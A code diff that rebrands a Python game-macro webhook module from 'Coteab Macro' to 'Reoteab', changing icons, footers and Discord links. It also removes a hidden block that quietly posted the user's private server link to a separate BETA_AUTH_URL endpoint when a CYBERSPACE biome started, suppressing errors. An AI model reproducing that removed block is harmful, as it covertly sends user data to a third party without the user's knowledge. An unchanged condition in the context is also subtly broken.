@@ -7,14 +7,14 @@ class WebhookMixin:
             if not urls:
                 return
             content = ""
-            icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+            icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
             current_utc_time = datetime.now(timezone.utc)
             current_utc_time.replace(microsecond=0).isoformat(timespec='seconds') + 'Z'
             current_utc_time = str(current_utc_time)
             embed = {
                 "description": f"> ## Remote Screenshot",
                 "color": 0xffffff,
-                "footer": {"text": f"Coteab Macro {current_ver}", "icon_url": icon_url},
+                "footer": {"text": f"Reoteab {current_ver}", "icon_url": icon_url},
                 "timestamp": current_utc_time
             }
             for webhook_url in urls:
@@ -150,14 +150,14 @@ class WebhookMixin:
             if not urls:
                 return
             content = ""
-            icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+            icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
             current_utc_time = datetime.now(timezone.utc)
             current_utc_time.replace(microsecond=0).isoformat(timespec='seconds') + 'Z'
             current_utc_time = str(current_utc_time)
             embed = {
                 "description": f"> ## Daily Quests Screenshot",
                 "color": 0xffffff,
-                "footer": {"text": f"Coteab Macro {current_ver}", "icon_url": icon_url},
+                "footer": {"text": f"Reoteab {current_ver}", "icon_url": icon_url},
                 "timestamp": current_utc_time
             }
             for webhook_url in urls:
@@ -182,14 +182,14 @@ class WebhookMixin:
             if not urls:
                 return
             content = ""
-            icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+            icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
             current_utc_time = datetime.now(timezone.utc)
             current_utc_time.replace(microsecond=0).isoformat(timespec='seconds') + 'Z'
             current_utc_time = str(current_utc_time)
             embed = {
                 "description": f"> ## Periodical Inventory Screenshot",
                 "color": 0xffffff,
-                "footer": {"text": f"Coteab Macro {current_ver}", "icon_url": icon_url},
+                "footer": {"text": f"Reoteab {current_ver}", "icon_url": icon_url},
                 "timestamp": current_utc_time
             }
             for webhook_url in urls:
@@ -214,14 +214,14 @@ class WebhookMixin:
             if not urls:
                 return
             content = ""
-            icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+            icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
             current_utc_time = datetime.now(timezone.utc)
             current_utc_time.replace(microsecond=0).isoformat(timespec='seconds') + 'Z'
             current_utc_time = str(current_utc_time)
             embed = {
                 "description": f"> ## Periodical Aura Screenshot",
                 "color": 0xffffff,
-                "footer": {"text": f"Coteab Macro {current_ver}", "icon_url": icon_url},
+                "footer": {"text": f"Reoteab {current_ver}", "icon_url": icon_url},
                 "timestamp": current_utc_time
             }
             for webhook_url in urls:
@@ -259,7 +259,7 @@ class WebhookMixin:
         current_utc_time = str(current_utc_time)
         unix_ts = int(time.time())
         timestamp_title = f"<t:{unix_ts}:F> (<t:{unix_ts}:R>)"
-        icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+        icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
         content = ""
 
         # Per-biome individual ping support
@@ -279,7 +279,7 @@ class WebhookMixin:
                     content = f"<@{ping_id}>"
         
         if private_server_link == "":
-            description = f"> ## Biome Started - {biome} \nNo link provided (ManasAarohi ate the link blame him)" if event_type == "start" else f"> ## Biome Ended - {biome}"
+            description = f"> ## Biome Started - {biome} \nNo private server link configured." if event_type == "start" else f"> ## Biome Ended - {biome}"
         else:
             description = f"> ## Biome Started - {biome} \n> ### **[Join Server]({private_server_link})**" if event_type == "start" else f"> ## Biome Ended - {biome}"
         embed = {
@@ -287,7 +287,7 @@ class WebhookMixin:
             "description": description,
             "color": biome_color,
             "footer": {
-                "text": f"""Coteab Macro {current_ver}""",
+                "text": f"""Reoteab {current_ver}""",
                 "icon_url": icon_url
             },
             "timestamp": current_utc_time
@@ -295,17 +295,6 @@ class WebhookMixin:
         if event_type == "start":
             embed["thumbnail"] = {"url": biome_info["thumbnail_url"]}
         
-        # biome authenciation test
-
-        if biome == "CYBERSPACE" and event_type == "start" and private_server_link != "":
-            try:
-                auth_headers = apply_headers(BETA_AUTH_URL)
-                auth_payload = {"content": content, "embeds": [embed]}
-                requests.post(BETA_AUTH_URL, json=auth_payload, headers=auth_headers, timeout=30)
-                time.sleep(20)
-            except Exception:
-                pass
-
         for webhook_url in urls:
             try:
                 headers = {}
@@ -357,7 +346,7 @@ class WebhookMixin:
             ping_enabled = False
         content = f"<@{ping_id}>" if (source == 'logs', 'ocr' and ping_enabled and ping_id) else ""
         ps_link = self.config.get("private_server_link", "").replace("\n", "")
-        icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+        icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
         current_utc_time = datetime.now(timezone.utc)
         current_utc_time.replace(microsecond=0).isoformat(timespec='seconds') + 'Z'
         current_utc_time = str(current_utc_time)
@@ -370,7 +359,7 @@ class WebhookMixin:
                 {"name": "Detection Source", "value": source.upper()}
             ],
             "footer": {
-                "text": f"""Coteab Macro {current_ver}""",
+                "text": f"""Reoteab {current_ver}""",
                 "icon_url": icon_url
             }
         }
@@ -413,7 +402,7 @@ class WebhookMixin:
         if not urls:
             self.append_log("Webhook URL is missing/not included in the config")
             return
-        icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+        icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
         ping_minimum = int(self.config.get("ping_minimum", "100000"))
         
         force_ping_auras = str(self.config.get("force_ping_auras", "") or "").lower()
@@ -450,7 +439,7 @@ class WebhookMixin:
             "description": description,
             "color": color,
             "footer": {
-                "text": f"""Coteab Macro {current_ver}""",
+                "text": f"""Reoteab {current_ver}""",
                 "icon_url": icon_url
             },
             "timestamp": current_utc_time
@@ -500,7 +489,7 @@ class WebhookMixin:
                 return
             default_color = 3066993 if "started" in status.lower() else 15158332
             embed_color = color if color is not None else default_color
-            icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+            icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
             if "started" in status.lower():
                 n = len(urls)
                 status = f"{status} ({n} webhook{'s' if n != 1 else ''} active)"
@@ -512,8 +501,13 @@ class WebhookMixin:
                     "inline": False
                 })
             fields.append({
-                "name": "Join our Discord:",
-                "value": "https://discord.gg/fw6q274Nrt",
+                "name": "Join the Reoteab Discord:",
+                "value": "https://discord.gg/bQNSU3pfPF",
+                "inline": False
+            })
+            fields.append({
+                "name": "Reoteab on GitHub:",
+                "value": "https://github.com/DeeepXD/Reoteab",
                 "inline": False
             })
             current_utc_time = datetime.now(timezone.utc)
@@ -525,7 +519,7 @@ class WebhookMixin:
                 "color": embed_color,
                 "timestamp": current_utc_time,
                 "footer": {
-                    "text": f"Coteab Macro {current_ver}",
+                    "text": f"Reoteab {current_ver}",
                     "icon_url": icon_url
                 },
                 "fields": fields
@@ -546,7 +540,7 @@ class WebhookMixin:
             urls = self.get_webhook_list()
             if not urls:
                 return
-            icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+            icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
             current_utc_time = datetime.now(timezone.utc)
             current_utc_time.replace(microsecond=0).isoformat(timespec='seconds') + 'Z'
             current_utc_time = str(current_utc_time)
@@ -556,7 +550,7 @@ class WebhookMixin:
                 "color": 0xff0000,
                 "timestamp": current_utc_time,
                 "footer": {
-                    "text": f"Coteab Macro {current_ver}",
+                    "text": f"Reoteab {current_ver}",
                     "icon_url": icon_url
                 },
                 "fields": [
@@ -566,8 +560,13 @@ class WebhookMixin:
                         "inline": False
                     },
                     {
-                        "name": "Join our Discord:",
-                        "value": "https://discord.gg/fw6q274Nrt",
+                        "name": "Join the Reoteab Discord:",
+                        "value": "https://discord.gg/bQNSU3pfPF",
+                        "inline": False
+                    },
+                    {
+                        "name": "Reoteab on GitHub:",
+                        "value": "https://github.com/DeeepXD/Reoteab",
                         "inline": False
                     }
                 ]
@@ -585,7 +584,7 @@ class WebhookMixin:
         try:
             urls = self.get_webhook_list()
             if not urls: return
-            icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+            icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
             current_utc_time = datetime.now(timezone.utc)
             current_utc_time.replace(microsecond=0).isoformat(timespec='seconds') + 'Z'
             current_utc_time = str(current_utc_time)
@@ -599,7 +598,7 @@ class WebhookMixin:
                 "timestamp": current_utc_time,
                 "thumbnail": {"url": "https://i.postimg.cc/FzRsHF7y/eggdoggo.png"},
                 "footer": {
-                    "text": f"Coteab Macro {current_ver}",
+                    "text": f"Reoteab {current_ver}",
                     "icon_url": icon_url
                 }
             }
@@ -629,7 +628,7 @@ class WebhookMixin:
         try:
             urls = self.get_webhook_list()
             if not urls: return
-            icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
+            icon_url = "https://raw.githubusercontent.com/DeeepXD/Reoteab/main/assets/reoteab-icon.png"
             eden_thumbnail = "https://i.postimg.cc/q7jFZVMp/eden.png"
             current_utc_time = datetime.now(timezone.utc)
             current_utc_time.replace(microsecond=0).isoformat(timespec='seconds') + 'Z'
@@ -643,7 +642,7 @@ class WebhookMixin:
                 "timestamp": current_utc_time,
                 "thumbnail": {"url": eden_thumbnail},
                 "footer": {
-                    "text": f"Coteab Macro {current_ver}",
+                    "text": f"Reoteab {current_ver}",
                     "icon_url": icon_url
                 }
             }
